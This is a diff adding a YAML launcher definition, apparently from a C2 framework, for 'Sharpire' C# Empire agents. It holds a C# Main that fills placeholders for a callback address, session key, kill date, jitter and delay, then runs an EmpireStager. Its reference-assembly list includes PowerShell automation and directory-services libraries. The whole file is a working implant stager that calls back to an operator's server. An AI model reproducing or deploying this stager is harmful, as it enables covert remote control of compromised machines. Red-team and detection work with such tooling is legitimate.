@@ -1,0 +1,101 @@
+- Name: Sharpire
+  Aliases: []
+  Description: CSharp empire agents.
+  Author: 
+      Name: Jake Krasnov
+      Handle: _Hubbl3
+      Link: https://twitter.com/_Hubbl3
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net40
+  - Net35
+  Code: |
+    using System;
+
+    using Sharpire;
+
+    public static class Program
+    {
+        public static void Main()
+        {
+            try
+            {
+              string address = "{{ REPLACE_ADDRESS }}";
+              string sessionkey = "{{ REPLACE_SESSIONKEY }}";
+              string workinghours = "{{ REPLACE_WORKINGHOURS }}";
+              string profile = "{{ REPLACE_PROFILE }}";
+              string killdate = "{{ REPLACE_KILLDATE }}";
+              uint delay = {{ REPLACE_DELAY }};
+              double jitter = {{ REPLACE_JITTER }};
+              uint lostlimit = {{ REPLACE_LOSTLIMIT }};
+              string agentlanguage = "dotnet";
+              string[] arguments = new string[] { address, sessionkey,  agentlanguage};
+
+              SessionInfo sessionInfo = new SessionInfo(arguments);
+              sessionInfo.SetWorkingHours(workinghours);
+              sessionInfo.SetDefaultJitter(jitter);
+              sessionInfo.SetDefaultDelay(delay);
+              sessionInfo.SetDefaultLostLimit(lostlimit);
+              (new EmpireStager(sessionInfo)).Execute();
+            }
+            catch (Exception e) { Console.WriteLine( e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: Sharpire
+    Description: Sharpire is a library for C# Empire Agents.
+    Location: Sharpire\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
